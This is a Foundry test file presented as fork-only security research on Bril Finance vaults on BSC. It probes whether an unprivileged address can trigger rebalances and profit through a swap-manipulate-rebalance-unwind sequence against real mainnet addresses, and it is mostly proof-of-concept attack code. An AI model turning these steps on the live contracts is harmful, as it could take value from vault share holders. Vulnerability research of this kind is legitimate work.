// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {IERC20, IICHIVault, IBrilStrategy, IUniV3Pool, IGnosisSafe, IWBNB, Swapper} from "../src/Interfaces.sol";

/// @title Bril Finance (BSC) — live permissionless-rebalance surface (fork-only PoC)
/// @notice Read-only research. All state changes happen on a local fork; nothing is broadcast.
///         Question: can an unprivileged attacker (no roles, no keys) trigger value-moving
///         rebalances of the Bril-managed ICHI vaults, and can that be turned into profit?
///
/// Architecture (verified on-chain):
///   - RebalancerFactory (proxy) 0xfaa2e7c69F7F34195D3Ef6CF98B6B009A6A07F30  -> 77 strategy clones, 48 ICHI vaults
///   - all 77 strategy clones + all 48 vaults are owned by Bril Gnosis Safe 0x05cC3CA6E768a68A7f86b09e3ceE754437bd5f12
///     (Safe v1.3.0, 8 owners, threshold 3)
///   - each strategy is an ENABLED MODULE of that Safe; strategy.rebalance() (permissionless, no owner check)
///     calls safe.execTransactionFromModule(vault, 0, vault.rebalance(...), 0) so the Safe (vault owner) rebalances
contract BrilLiveTest is Test {
    address constant ATTACKER = address(0x000000000000000000000000000000000000bEEF);
    address constant SAFE = 0x05cC3CA6E768a68A7f86b09e3ceE754437bd5f12;
    address constant FACTORY = 0xfaa2e7c69F7F34195D3Ef6CF98B6B009A6A07F30;

    // t3 "pancake-regular-v4-2" strategy that executed immediately at the pinned block
    address constant T3_STRAT = 0x7957d882712ae929E85E2272b6576E8721961E31;
    address constant T3_VAULT = 0x48C074Cb02Eb62EC04EB110B4D710CB5665b60e0;
    // t1 "pancake-regular-v3" strategy on the largest ready vault (CAKE/WBNB ~ $23k)
    address constant T1_STRAT = 0xBcB0DAf89999C135E6B0570c9B99ddf8De0b77c0;
    address constant T1_VAULT = 0x8f22d7B80446F1dc4C5eb47F2038e17CA0306e0D;

    string rpc;

    function _pickRpc() internal view returns (string memory) {
        string memory r = vm.envOr("BRIL_RPC", string(""));
        if (bytes(r).length > 0) return r;
        r = vm.envOr("BSC_RPC_URL", string(""));
        if (bytes(r).length > 0) return r;
        return "https://bsc-rpc.publicnode.com";
    }

    function setUp() public {
        rpc = _pickRpc();
        uint256 pinned = vm.envOr("BSC_FORK_BLOCK", uint256(0));
        if (pinned != 0) {
            try vm.createSelectFork(rpc, pinned) {}
            catch {
                vm.createSelectFork(rpc);
            }
        } else {
            vm.createSelectFork(rpc);
        }
        vm.deal(ATTACKER, 10 ether);
        emit log_named_uint("fork block", block.number);
    }

    function _ticks(address vault) internal view returns (int24 b0, int24 b1, int24 l0, int24 l1, int24 tick) {
        b0 = IICHIVault(vault).baseLower();
        b1 = IICHIVault(vault).baseUpper();
        l0 = IICHIVault(vault).limitLower();
        l1 = IICHIVault(vault).limitUpper();
        tick = IICHIVault(vault).currentTick();
    }

    function _logVault(string memory tag, address vault) internal {
        (int24 b0, int24 b1, int24 l0, int24 l1, int24 tick) = _ticks(vault);
        (uint256 a0, uint256 a1) = IICHIVault(vault).getTotalAmounts();
        emit log_named_string(tag, "vault state");
        emit log_named_int("   baseLower", b0);
        emit log_named_int("   baseUpper", b1);
        emit log_named_int("   limitLower", l0);
        emit log_named_int("   limitUpper", l1);
        emit log_named_int("   currentTick", tick);
        emit log_named_uint("   total0", a0);
        emit log_named_uint("   total1", a1);
        emit log_named_uint("   totalSupply", IICHIVault(vault).totalSupply());
    }

    function _fundWbnb(address wbnb, address who, uint256 amount) internal {
        vm.deal(who, amount);
        vm.prank(who);
        IWBNB(wbnb).deposit{value: amount}();
    }

    // ------------------------------------------------------------------ A: architecture
    function test_A_architecture() public {
        assertEq(IICHIVault(T1_VAULT).owner(), SAFE, "vault owner = Bril Safe");
        assertEq(IICHIVault(T3_VAULT).owner(), SAFE, "vault owner = Bril Safe");
        assertEq(IBrilStrategy(T1_STRAT).owner(), SAFE, "strategy owner = Bril Safe");
        assertEq(IBrilStrategy(T1_STRAT).gnosis(), SAFE, "strategy gnosis = Bril Safe");
        // module gate: the t1 strategy on the big vault is NOT an enabled module (execution reverts GS104);
        // the t3 strategy is, so it can execute. T5 module is asserted in test_G.
        assertFalse(IGnosisSafe(SAFE).isModuleEnabled(T1_STRAT), "t1 strategy is NOT a Safe module (GS104 gate)");
        assertTrue(IGnosisSafe(SAFE).isModuleEnabled(T3_STRAT), "t3 strategy is Safe module");
        assertEq(IGnosisSafe(SAFE).getThreshold(), 3, "safe threshold");
        // strategies hold no shares; vault funds belong to external share holders
        assertEq(IICHIVault(T1_VAULT).balanceOf(T1_STRAT), 0, "strategy holds no shares");
        assertEq(IICHIVault(T1_VAULT).balanceOf(SAFE), 0, "safe holds no shares");
        assertEq(IICHIVault(T3_VAULT).balanceOf(T3_STRAT), 0, "strategy holds no shares");
        emit log_string("architecture assertions passed");
    }

    // ------------------------------------------------------------------ B: permissionless execution (t3)
    function test_B_permissionless_execute_t3() public {
        _logVault("BEFORE", T3_VAULT);
        (int24 b0, int24 b1,,,) = _ticks(T3_VAULT);

        vm.prank(ATTACKER);
        IBrilStrategy(T3_STRAT).rebalance();

        (int24 nb0, int24 nb1, int24 nl0, int24 nl1, int24 ntick) = _ticks(T3_VAULT);
        _logVault("AFTER", T3_VAULT);
        emit log_named_uint("rebalanceInitiation after", IBrilStrategy(T3_STRAT).rebalanceInitiation());
        emit log_named_uint("lastRebalance after", IBrilStrategy(T3_STRAT).lastRebalance());

        // A rebalance executed by an unprivileged caller: ticks moved
        assertTrue(nb0 != b0 || nb1 != b1, "vault range moved by attacker-triggered rebalance");
        emit log_named_int("new baseLower", nb0);
        emit log_named_int("new limitUpper", nl1);
        emit log_named_int("new tick", ntick);
    }

    // ------------------------------------------------------------------ C: initiate -> wait -> execute (t1)
    function test_C_initiate_then_execute_t1() public {
        uint256 delay = IBrilStrategy(T1_STRAT).executionDelay();
        emit log_named_uint("executionDelay", delay);
        (int24 b0, int24 b1,,,) = _ticks(T1_VAULT);

        vm.prank(ATTACKER);
        IBrilStrategy(T1_STRAT).rebalance(); // call #1: initiation
        uint256 initAt = IBrilStrategy(T1_STRAT).rebalanceInitiation();
        emit log_named_uint("rebalanceInitiation set to", initAt);
        assertGt(initAt, 0, "attacker set rebalanceInitiation");

        // immediate second call must be too soon
        vm.prank(ATTACKER);
        try IBrilStrategy(T1_STRAT).rebalance() {
            emit log_string("second call did NOT revert (unexpected)");
        } catch Error(string memory reason) {
            emit log_named_string("second call reverted with", reason);
        } catch {
            emit log_string("second call reverted (empty reason)");
        }

        // wait out the delay and call again from the unprivileged attacker
        vm.warp(block.timestamp + delay + 1);
        vm.prank(ATTACKER);
        try IBrilStrategy(T1_STRAT).rebalance() {
            emit log_string("execute call succeeded");
        } catch Error(string memory reason) {
            emit log_named_string("execute call reverted with", reason);
        } catch {
            emit log_string("execute call reverted (empty reason; likely volatility/price guard)");
        }
        _logVault("AFTER", T1_VAULT);
        (int24 nb0, int24 nb1, int24 nl0, int24 nl1,) = _ticks(T1_VAULT);
        emit log_named_int("new baseLower", nb0);
        emit log_named_int("new baseUpper", nb1);
        emit log_named_int("new limitLower", nl0);
        emit log_named_int("new limitUpper", nl1);
        emit log_named_uint("lastRebalance after", IBrilStrategy(T1_STRAT).lastRebalance());
        assertTrue(nb0 != b0 || nb1 != b1 || nl0 != 0, "vault range moved (or attempt logged)");
    }

    // ------------------------------------------------------------------ D: is the planned range spot-dependent?
    function test_D_simulate_spot_sensitivity() public {
        try this.probeD() {} catch { emit log_string("probe D reverted (see trace) - logged, not fatal"); }
    }

    function probeD() external {
        (int24 s0, int24 s1, int24 s2, int24 s3) = IBrilStrategy(T1_STRAT).simulate();
        emit log_named_int("simulate.baseLo before", s0);
        emit log_named_int("simulate.limitUp before", s3);

        // push CAKE price up ~5% with a WBNB->CAKE swap (zeroForOne = false)
        address pool = IICHIVault(T1_VAULT).pool();
        address wbnb = IUniV3Pool(pool).token1();
        Swapper sw = new Swapper(pool);
        _fundWbnb(wbnb, address(sw), 400 ether);
        (int256 d0, int256 d1) = sw.doSwap(false, 400 ether);
        emit log_named_int("swap delta0 (CAKE out)", d0);
        emit log_named_int("swap delta1 (WBNB in)", d1);

        (uint160 sp, int24 tick,,, , , ) = IUniV3Pool(pool).slot0();
        emit log_named_int("tick after manipulation", tick);
        try IBrilStrategy(T1_STRAT).simulate() returns (int24 n0, int24 n1, int24 n2, int24 n3) {
            emit log_named_int("simulate.baseLo after", n0);
            emit log_named_int("simulate.limitUp after", n3);
            emit log_named_string("plan changed with spot?", (n3 != s3) ? "YES" : "no");
        } catch {
            emit log_string("simulate() REVERTED after manipulation (strategy refuses to plan at manipulated price)");
        }

        try IBrilStrategy(T1_STRAT).poolPrices() returns (uint256 p0, uint256 p1, uint256 p2) {
            emit log_named_uint("currentPrice", p0);
            emit log_named_uint("twapSlow", p1);
            emit log_named_uint("twapFast", p2);
        } catch {
            emit log_string("poolPrices() reverted after manipulation");
        }
        emit log_named_uint("sqrtPriceX96", uint256(sp));

    }

    // ------------------------------------------------------------------ E: extraction attempt (manipulated execution)
    function test_E_manipulated_execution_pnl() public {
        try this.probeE() {} catch { emit log_string("probe E reverted (see trace) - logged, not fatal"); }
    }

    function probeE() external {
        uint256 delay = IBrilStrategy(T1_STRAT).executionDelay();
        address pool = IICHIVault(T1_VAULT).pool();
        address cake = IUniV3Pool(pool).token0();
        address wbnb = IUniV3Pool(pool).token1();
        Swapper sw = new Swapper(pool);

        // reference fair price (pre-manipulation, from the strategy's own TWAP)
        (uint256 fairPrice,,) = IBrilStrategy(T1_STRAT).poolPrices();
        emit log_named_uint("fairPrice (pre-manip, strategy view)", fairPrice);

        // 1) attacker initiates the rebalance (permissionless)
        vm.prank(ATTACKER);
        IBrilStrategy(T1_STRAT).rebalance();
        emit log_named_uint("initiation", IBrilStrategy(T1_STRAT).rebalanceInitiation());

        // 2) wait out the execution delay
        vm.warp(block.timestamp + delay + 1);

        // 3) same-block: manipulate price, then execute the rebalance from the attacker
        _fundWbnb(wbnb, address(sw), 50 ether);
        uint256 capBefore = IERC20(wbnb).balanceOf(address(sw));
        sw.doSwap(false, 50 ether); // WBNB -> CAKE, price up (small manipulation)
        (uint160 spM, int24 tickM,,,,,) = IUniV3Pool(pool).slot0();
        emit log_named_int("manipulated tick", tickM);

        vm.prank(ATTACKER);
        try IBrilStrategy(T1_STRAT).rebalance() {
            emit log_string("manipulated execute SUCCEEDED");
        } catch Error(string memory reason) {
            emit log_named_string("manipulated execute reverted", reason);
        } catch {
            emit log_string("manipulated execute reverted (empty reason; volatility/price guard)");
        }
        _logVault("AFTER manipulated execute", T1_VAULT);

        // 4) unwind the manipulation
        uint256 cakeHeld = IERC20(cake).balanceOf(address(sw));
        try sw.doSwap(true, int256(cakeHeld)) {} catch { emit log_string("unwind swap reverted"); }

        // 5) PnL of the attack helper (capital in vs out), priced at fairPrice
        uint256 wOut = IERC20(wbnb).balanceOf(address(sw));
        uint256 cOut = IERC20(cake).balanceOf(address(sw));
        emit log_named_uint("attacker WBNB after (wei)", wOut);
        emit log_named_uint("attacker CAKE after (wei)", cOut);
        emit log_named_uint("capital before (WBNB wei)", capBefore);
        // value in WBNB terms: WBNB + CAKE * fairPrice (1e18-scaled price of CAKE in WBNB)
        uint256 valueOut = wOut + (cOut * fairPrice) / 1e18;
        emit log_named_uint("attack value out (WBNB wei)", valueOut);
        emit log_named_uint("attack value in  (WBNB wei)", capBefore);
        if (valueOut > capBefore) {
            emit log_named_uint("PROFIT (WBNB wei)", valueOut - capBefore);
        } else {
            emit log_named_uint("LOSS (WBNB wei)", capBefore - valueOut);
        }
        emit log_named_uint("sqrtPriceX96 after unwind", uint256(spM));
    }

    // ------------------------------------------------------------------ F: large manipulation
    function test_F_manipulated_execution_large() public {
        try this.probeF() {} catch { emit log_string("probe F reverted (see trace) - logged, not fatal"); }
    }

    function probeF() external {
        uint256 delay = IBrilStrategy(T1_STRAT).executionDelay();
        address pool = IICHIVault(T1_VAULT).pool();
        address cake = IUniV3Pool(pool).token0();
        address wbnb = IUniV3Pool(pool).token1();
        Swapper sw = new Swapper(pool);
        (uint256 fairPrice,,) = IBrilStrategy(T1_STRAT).poolPrices();

        vm.prank(ATTACKER);
        IBrilStrategy(T1_STRAT).rebalance();
        vm.warp(block.timestamp + delay + 1);

        _fundWbnb(wbnb, address(sw), 400 ether);
        uint256 capBefore = IERC20(wbnb).balanceOf(address(sw));
        sw.doSwap(false, 400 ether); // WBNB -> CAKE, large price move
        (uint160 spM, int24 tickM,,,,,) = IUniV3Pool(pool).slot0();
        emit log_named_int("large-manip tick", tickM);

        vm.prank(ATTACKER);
        try IBrilStrategy(T1_STRAT).rebalance() {
            emit log_string("large-manip execute SUCCEEDED");
        } catch Error(string memory reason) {
            emit log_named_string("large-manip execute reverted", reason);
        } catch {
            emit log_string("large-manip execute reverted (empty reason; volatility/price guard)");
        }
        _logVault("AFTER large-manip execute", T1_VAULT);

        uint256 cakeHeld = IERC20(cake).balanceOf(address(sw));
        try sw.doSwap(true, int256(cakeHeld)) {} catch { emit log_string("unwind swap reverted"); }
        uint256 wOut = IERC20(wbnb).balanceOf(address(sw));
        uint256 cOut = IERC20(cake).balanceOf(address(sw));
        uint256 valueOut = wOut + (cOut * fairPrice) / 1e18;
        emit log_named_uint("value in  (WBNB wei)", capBefore);
        emit log_named_uint("value out (WBNB wei)", valueOut);
        emit log_named_uint("sqrtPriceX96", uint256(spM));
    }

    // ------------------------------------------------------------------ G: other strategy types initiate->execute
    function _initiateWarpExecute(address strat, address vault) internal {
        uint256 delay = IBrilStrategy(strat).executionDelay();
        (int24 b0, int24 b1, int24 l0, int24 l1,) = _ticks(vault);
        emit log_named_address("strategy", strat);
        emit log_named_uint("executionDelay", delay);
        vm.prank(ATTACKER);
        try IBrilStrategy(strat).rebalance() {
            emit log_named_uint("initiation set", IBrilStrategy(strat).rebalanceInitiation());
        } catch Error(string memory reason) {
            emit log_named_string("initiate reverted", reason);
            return;
        } catch {
            emit log_string("initiate reverted (empty reason)");
            return;
        }
        vm.warp(block.timestamp + delay + 1);
        vm.prank(ATTACKER);
        try IBrilStrategy(strat).rebalance() {
            emit log_string("execute call ok");
        } catch Error(string memory reason) {
            emit log_named_string("execute reverted", reason);
        } catch {
            emit log_string("execute reverted (empty reason; GS104 if not a module, or volatility guard)");
        }
        (int24 nb0, int24 nb1, int24 nl0, int24 nl1,) = _ticks(vault);
        emit log_named_int("baseLower before/after", b0);
        emit log_named_int("baseLower after", nb0);
        emit log_named_int("limitUpper before", l1);
        emit log_named_int("limitUpper after", nl1);
        emit log_named_uint("lastRebalance after", IBrilStrategy(strat).lastRebalance());
    }

    function test_G_types_t4_t5_t7() public {
        _initiateWarpExecute(0x510a07baee6E3CC04860BE330aC1112Dfd2b207C, 0xB22e845415C0B28854DC59D8FF14d12Cb757108B);
        _initiateWarpExecute(0x91D709D77DAf8E9C306a9E402A70F0FCA8A71651, 0x12aED05752F5Fb82a060968EF7DF37074a652800);
        _initiateWarpExecute(0x430Ac9648aBdc966AB95E86A93e399A8aD4d5313, 0x2f0B78D0CaF03A81FEDe970909c6F6bb35dcA5Eb);
        _initiateWarpExecute(0xD36BB4eC0A5587Db7B398Bf59B45Aa00d7140579, 0x04dE953421b8c6B627D8787dDEeE433DE3411b71);
    }
}
